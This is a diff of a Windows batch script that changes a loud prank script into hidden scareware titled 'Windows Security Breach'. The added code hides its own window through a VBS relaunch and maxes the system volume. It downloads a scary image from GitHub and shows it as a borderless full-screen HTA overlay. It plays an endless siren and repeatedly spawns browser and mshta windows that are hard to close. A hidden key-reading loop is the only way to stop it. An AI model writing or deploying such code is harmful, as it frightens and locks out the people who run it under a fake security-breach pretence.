@@ -1,24 +1,39 @@
 @echo off
-title PASHA TEST MODE
+title Windows Security Breach
 
-echo [1] Downloading scary image to your PC...
+:: 1. Hide the black window
+if not "%~1"=="hidden" (
+    echo CreateObject("Wscript.Shell").Run "cmd /c ""%~f0"" hidden", 0, False > "%temp%\h.vbs"
+    wscript "%temp%\h.vbs"
+    del "%temp%\h.vbs"
+    exit
+)
+
+:: 2. MAX OUT THE VOLUME (Presses Volume Up 50 times)
+powershell -c "$obj = New-Object -ComObject WScript.Shell; 1..50 | %% { $obj.SendKeys([char]175) }"
+
+:: 3. Download the scary image locally (bypasses VM security)
 powershell -c "Invoke-WebRequest -Uri 'https://raw.githubusercontent.com/ExcluseDev/scotty-sim/main/scaryback.png' -OutFile \"$env:TEMP\scary.png\""
 
-echo [2] Starting loud banging noise...
-start /b powershell -c "while($true) { (New-Object Media.SoundPlayer 'C:\Windows\Media\Alarm01.wav').PlaySync() }"
+:: 4. Create and launch the Scary Image Overlay
+:: We generate a temporary HTA file so it runs as a native window, always on top
+echo ^<html^>^<head^>^<hta:application id="oHTA" border="none" caption="no" maximizebutton="no" minimizebutton="no" showintaskbar="no" scroll="no" windowstate="maximize" /^>^</head^>^<body style="background-color:black; overflow:hidden; margin:0; padding:0;"^>^<img src="file:///%temp%\scary.png" style="width:100%%; height:100%%; object-fit:cover; filter:brightness(0.3) contrast(2);"^>^</body^>^</html^> > "%temp%\scare.hta"
+start /b mshta "%temp%\scare.hta"
 
-echo [3] Opening scary image overlay...
-:: We load the local temp file instead of the web link
-start /b mshta "javascript:var s='<html><body style=background-color:black;margin:0;overflow:hidden;><img src=file:///%temp%\scary.png style=width:100vw;height:100vh;object-fit:cover;filter:brightness(0.5) contrast(2);></body></html>';document.write(s);window.moveTo(0,0);window.resizeTo(screen.width,screen.height);"
+:: 5. Start the POWERFUL Tornado Siren (Sweeping frequencies)
+start /b powershell -window hidden -c "while($true) { [console]::beep(800, 200); [console]::beep(1000, 200); [console]::beep(1200, 200); [console]::beep(900, 200) }"
 
-echo [4] Opening videos...
-start "" "https://www.youtube.com/watch?v=UMWyh0VilWk"
-start "" "https://www.youtube.com/watch?v=BIaMFvNbShE&t=1s"
+:: 6. The Keylogger Escape Hatch (Type 'exc' to kill everything)
+start /b powershell -window hidden -c "$seq=''; while($true) { $key = $Host.UI.RawUI.ReadKey('NoEcho,IncludeKeyDown'); if ($key.Character -match '[a-z]') { $seq += $key.Character; if ($seq.Length -gt 3) { $seq = $seq.Substring(1) }; if ($seq -eq 'exc') { taskkill /F /IM mshta.exe; taskkill /F /IM powershell.exe; taskkill /F /IM cmd.exe; exit } } }"
 
-echo [5] Starting browser spam loop...
+:: 7. The Scattered Tab Spam Loop
 :spam
-:: We use start "" to just open the default browser, in case you don't have Chrome/Firefox
-start "" "https://www.youtube.com/watch?v=BIaMFvNbShE&t=1s"
+:: Opens Edge in random sizes and positions on the screen
+start "" msedge --new-window "https://www.youtube.com/watch?v=BIaMFvNbShE&t=1s"
+:: Use mshta to force floating windows that you can't easily close
+start "" mshta "javascript:window.resizeTo(400,300); window.moveTo(Math.floor(Math.random()*800), Math.floor(Math.random()*600)); window.location.href='https://www.youtube.com/watch?v=BIaMFvNbShE&t=1s';"
+start "" mshta "javascript:window.resizeTo(500,400); window.moveTo(Math.floor(Math.random()*800), Math.floor(Math.random()*600)); window.location.href='https://www.youtube.com/watch?v=UMWyh0VilWk';"
 
+:: Wait 1.5 seconds before the next wave
 timeout /t 1 /nobreak >nul
 goto spam
